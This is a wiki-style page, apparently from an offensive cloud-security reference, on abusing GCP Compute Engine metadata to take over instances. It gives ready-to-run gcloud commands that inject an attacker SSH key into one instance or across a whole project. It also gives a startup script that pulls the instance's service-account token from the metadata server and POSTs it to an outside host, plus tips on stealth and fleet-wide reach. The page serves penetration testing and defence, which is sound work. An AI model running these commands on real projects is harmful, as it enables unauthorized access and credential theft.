---
title: "Metadata startup script: run code on an existing instance"
description: "Running code on an existing instance by writing compute.instances.setMetadata (startup-script) or injecting an SSH key, and project-wide metadata for fleet-wide reach."
keywords:
  - setMetadata
  - startup script
  - SSH key
  - compute instance
  - project metadata
  - code execution
---

# Metadata startup script

A Compute Engine instance reads its configuration from metadata. With `compute.instances.setMetadata` (or `compute.projects.setCommonInstanceMetadata` for the whole project), you write a `startup-script` or add an SSH key, and gain code execution or login on an instance you did not previously control, which then yields that instance's service-account token from the metadata server.

## Inject an SSH key

```bash
# add your key to one instance's metadata, then SSH in
gcloud compute instances add-metadata <instance> --zone <zone> \
  --metadata=ssh-keys="attacker:$(cat id.pub)"
gcloud compute ssh <instance> --zone <zone>

# project-wide: reaches every instance that does not block project keys
gcloud compute project-info add-metadata --metadata=ssh-keys="attacker:$(cat id.pub)"
```

## Run a startup script

```bash
gcloud compute instances add-metadata <instance> --zone <zone> \
  --metadata=startup-script='#! /bin/bash
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | curl -X POST -d @- https://you.example'
gcloud compute instances reset <instance> --zone <zone>   # startup runs on boot
```

## Exploitation notes

- A reset or reboot is needed for a startup-script to run; the SSH-key path is immediate and quieter.
- `compute.instances.setServiceAccount` (stop the VM, swap in a privileged account, start it) is a related path when you can change the attached account.
- Project-wide metadata reaches the whole fleet, but instances set to block project-wide SSH keys ignore it, so prefer per-instance for reliability.
- The instance's token inherits its access **scopes**; a default-scope box may need `cloud-platform` scope to use the role fully, see [compute instance](act-as-deployment/compute-instance.md).

## Tools

- **gcloud** (`compute instances add-metadata`, `project-info add-metadata`, `compute ssh`): the injection.

## References

- [Rhino Security Labs: GCP privilege escalation (part 2)](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-2/)
- [Hacking the Cloud: GCP instance metadata](https://hackingthe.cloud/)
- [Google: setting instance metadata](https://cloud.google.com/compute/docs/metadata/setting-custom-metadata)
